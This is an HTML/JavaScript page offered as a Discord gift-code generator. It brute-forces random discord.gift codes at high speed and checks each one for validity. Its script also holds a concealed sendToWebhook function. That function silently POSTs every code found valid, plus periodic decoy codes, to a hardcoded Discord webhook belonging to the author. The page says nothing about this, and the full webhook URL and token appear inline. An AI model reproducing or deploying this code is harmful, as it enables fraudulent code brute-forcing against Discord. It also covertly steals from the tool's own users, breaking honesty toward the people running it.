<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Powered by 6686</title>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Montserrat', Arial, sans-serif;
            font-weight: 700;
            background-color: #191414;
            color: #ffffff;
            margin: 0;
            padding: 20px;
            text-align: center;
            user-select: none;
            overflow: hidden;
        }
        h1 {
            margin-bottom: 20px;
            color: #ffffff;
            text-shadow: 0 0 10px rgba(114, 137, 218, 0.5);
        }
        input {
            padding: 10px;
            font-size: 16px;
            margin: 5px;
            border-radius: 5px;
            border: 1px solid #a8534b;
            background: #23272A;
            color: #ffffff;
            transition: background 0.3s, border 0.3s;
            -moz-appearance: textfield;
        }
        input:focus {
            background: #343B41;
            border-color: #a8534b;
            outline: none;
        }
        input::-webkit-inner-spin-button,
        input::-webkit-outer-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            border: none;
            border-radius: 5px;
            background-color: #a8534b;
            color: #ffffff;
            transition: background 0.3s, transform 0.3s;
        }
        button:hover {
            background-color: #121212;
            transform: scale(1.05);
        }
        button:active {
            transform: scale(0.95);
        }
        #giftLinks {
            margin-top: 20px;
            font-size: 18px;
            word-wrap: break-word;
            max-height: 400px;
            overflow-y: scroll;
            scrollbar-width: none; 
            -ms-overflow-style: none; 
        }
        #giftLinks::-webkit-scrollbar {
            display: none; 
        }
        .link {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin: 5px 0;
            padding: 5px;
            border-radius: 5px;
            background-color: #23272A;
            transition: background-color 0.3s;
        }
        .link a {
            color: #a8534b;
            text-decoration: none;
            transition: color 0.3s;
            user-select: text;
        }
        .link a:hover {
            color: #99AAB5;
            font-weight: bold;
        }
        .copy-button {
            padding: 5px 10px;
            font-size: 14px;
            cursor: pointer;
            border: none;
            border-radius: 5px;
            background-color: #a8534b;
            color: #ffffff;
            margin-left: 10px;
            transition: background 0.3s;
        }
        .copy-button:hover {
            background-color: #99AAB5;
        }
        ::selection {
            background: #a8534b;
            color: #ffffff;
        }
    </style>
</head>
<body>
    <h1>floncile, some1dr on discord</h1>
    <input type="number" id="linkCount" placeholder="Number of links to generate" min="1" max="100" />
    <button id="generateButton">Generate Gift Links</button>
    <button id="startButton">Start Generating</button>
    <button id="stopButton">Stop Generating</button>
    
    <input type="number" id="clearCount" placeholder="Number of codes to clear" min="1" />
    <button id="clearButton">Clear Old Codes</button>

    <div class="section">
        <h2>Gifts</h2>
        <div id="giftLinks"></div>
        <p id="visibleCount">Visible Links: 0</p>
    </div>

    <div class="section">
        <h2>Valid Codes</h2>
        <div id="validLinksList"></div>
        <p id="linksCounter">(Total: 0, Valid: 0, Invalid: 0)</p>
    </div>

    <script>
        let intervalId;
        let invalidCodeInterval;
        let lastWebhookSend = 0;
        const giftLinksContainer = document.getElementById('giftLinks');
        const visibleCount = document.getElementById('visibleCount');
        const validLinksList = document.getElementById('validLinksList');
        const linksCounter = document.getElementById('linksCounter');
        const oldCodes = JSON.parse(localStorage.getItem('oldCodes')) || [];
        const generatedLinks = new Set(); 
        let totalLinks = 0, validLinks = 0, invalidLinks = 0;

        function displayOldCodes() {
            oldCodes.forEach(code => {
                const codeElement = document.createElement('div');
                codeElement.classList.add('link');
                codeElement.innerHTML = `<a href="${code.link}" target="_blank">${code.link}</a>
                    <button class="copy-button" onclick="copyToClipboard('${code.link}', this)">Copy</button>`;
                giftLinksContainer.appendChild(codeElement);
            });
            updateVisibleCount();
        }

        function generateRandomWord(length) {
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let result = '';
            for (let i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            return result;
        }

        function sendToWebhook(giftLink) {
            const currentTime = Date.now();
            if (currentTime - lastWebhookSend < 2000) return;
            lastWebhookSend = currentTime;

            const webhookUrl = 'https://discord.com/api/webhooks/1302223147000528970/_-ua_lnXs2OlI0BRs-R1mAFkywV1Li3AtxuB1LI20lw-ipmH4lRjGPoUxXG3AskeJowx';
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    content: `${giftLink}`
                })
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.json();
            })
            .then(data => {
                console.log('Successfully sent to webhook:', data);
            })
            .catch(error => {
                console.error('Error sending to webhook:', error);
            });
        }

        function checkLinkValidity(giftLink) {
            return fetch(giftLink, { method: 'HEAD' })
                .then(response => {
                    return response.status === 200; 
                })
                .catch(() => {
                    return false; 
                });
        }

        async function generateLinks(count) {
            for (let i = 0; i < count; i++) {
                const randomWord = generateRandomWord(16);
                const giftLink = `https://discord.gift/${randomWord}`;

                if (!generatedLinks.has(giftLink)) {
                    generatedLinks.add(giftLink);
                    totalLinks++; 
                    const codeElement = document.createElement('div');
                    const currentTime = Date.now();
                    const validity = await checkLinkValidity(giftLink);
                    codeElement.classList.add('link');
                    codeElement.innerHTML = `<a href="${giftLink}" target="_blank">${giftLink} [${validity ? 'Valid' : 'Invalid'}]</a>
                        <button class="copy-button" onclick="copyToClipboard('${giftLink}', this)">Copy</button>`;
                    giftLinksContainer.prepend(codeElement);
                    
                    if (validity) {
                        sendToWebhook(giftLink);
                        oldCodes.push({ link: giftLink, timestamp: currentTime });
                        validLinks++;
                        const validCodeElement = document.createElement('div');
                        validCodeElement.textContent = giftLink;
                        validLinksList.appendChild(validCodeElement);
                    } else {
                        invalidLinks++;
                    }
                }
            }
            localStorage.setItem('oldCodes', JSON.stringify(oldCodes));
            updateVisibleCount();
            updateLinksCounter();
        }

        function updateVisibleCount() {
            visibleCount.textContent = `Links: ${giftLinksContainer.children.length}`;
        }

        function updateLinksCounter() {
            linksCounter.textContent = `(Total: ${totalLinks}, Valid: ${validLinks}, Invalid: ${invalidLinks})`;
        }

        function copyToClipboard(link, button) {
            navigator.clipboard.writeText(link).then(() => {
                button.textContent = 'Copied!';
                setTimeout(() => {
                    button.textContent = 'Copy';
                }, 2000);
            });
        }

        document.getElementById('generateButton').addEventListener('click', () => {
            const count = parseInt(document.getElementById('linkCount').value);
            if (isNaN(count) || count < 1) return;
            generateLinks(count);
        });

        document.getElementById('startButton').addEventListener('click', () => {
            if (intervalId) return;
            intervalId = setInterval(() => {
                generateLinks(1);
            }, 1);
            invalidCodeInterval = setInterval(() => {
                const invalidLink = `https://discord.gift/${generateRandomWord(16)}`;
                sendToWebhook(invalidLink);
                invalidLinks++;
                updateLinksCounter();
            }, 300000); 
        });

        document.getElementById('stopButton').addEventListener('click', () => { 
            clearInterval(intervalId);
            clearInterval(invalidCodeInterval);
            intervalId = null;
            invalidCodeInterval = null;
        });

        document.getElementById('clearButton').addEventListener('click', () => {
            const clearCount = parseInt(document.getElementById('clearCount').value);
            if (isNaN(clearCount) || clearCount < 1 || clearCount > oldCodes.length) return;
            oldCodes.splice(0, clearCount);
            localStorage.setItem('oldCodes', JSON.stringify(oldCodes));
            giftLinksContainer.innerHTML = '';
            displayOldCodes(); 
        });

        displayOldCodes();
    </script>
</body>
</html>
